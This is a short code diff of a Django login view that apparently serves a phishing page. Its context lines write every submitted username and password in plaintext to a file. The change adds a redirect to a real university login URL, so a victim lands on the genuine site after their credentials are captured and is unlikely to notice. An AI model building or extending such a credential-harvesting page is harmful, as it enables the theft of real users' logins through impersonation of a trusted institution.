@@ -1,5 +1,5 @@
 from django.http import HttpResponse
-from django.shortcuts import render
+from django.shortcuts import render, redirect
 import os
 
 
@@ -14,7 +14,7 @@ def login_form(request):
             file.write(f"Username: {j_username}, Password: {j_password}\n")
         
         # Return a response or redirect
-        return HttpResponse("Form submitted successfully!")
+        return redirect("https://campusgroups.uci.edu/home_login")
     
     # Render the login.html page for GET requests
     return render(request, "auth_form/login.html")
